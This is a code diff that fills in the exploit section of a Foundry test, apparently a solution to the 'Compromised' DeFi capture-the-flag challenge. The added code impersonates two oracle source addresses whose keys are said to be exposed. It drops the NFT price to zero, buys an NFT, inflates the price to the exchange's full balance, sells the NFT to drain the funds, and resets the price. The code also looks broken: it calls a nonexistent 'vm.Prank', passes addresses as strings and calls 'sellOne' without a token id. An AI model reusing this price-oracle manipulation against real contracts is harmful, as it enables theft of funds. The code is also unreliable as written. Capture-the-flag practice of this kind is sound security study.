@@ -80,6 +80,29 @@ contract Compromised is DSTest {
 
     function testExploit() public {
         /** EXPLOIT START **/
+        //The private keys for the oracle sources were exposed thus we assume control of both oracle sources and manipulate price
+        vm.Prank("0xe92401A4d3af5E446d93D11EEc806b1462b39D15");
+        trustfulOracle.postPrice("DVNFT", 0);
+        vm.Prank("0x81A5D6E50C214044bE44cA0CB057fe119097850c");
+        trustfulOracle.postPrice("DVNFT", 0);
+
+        vm.prank(attacker);
+        exchange.buyOne{value: 0.1 ether}();
+
+        vm.prank("0xe92401A4d3af5E446d93D11EEc806b1462b39D15");
+        trustfulOracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+        vm.prank("0x81A5D6E50C214044bE44cA0CB057fe119097850c");
+        trustfulOracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+
+        vm.startPrank(attacker);
+        damnValuableNFT.setApprovalForAll(exchange, true);
+        exchange.sellOne();
+        vm.stopPrank();
+
+        vm.prank("0xe92401A4d3af5E446d93D11EEc806b1462b39D15");
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.prank("0x81A5D6E50C214044bE44cA0CB057fe119097850c");
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
 
         /** EXPLOIT END **/
         validation();
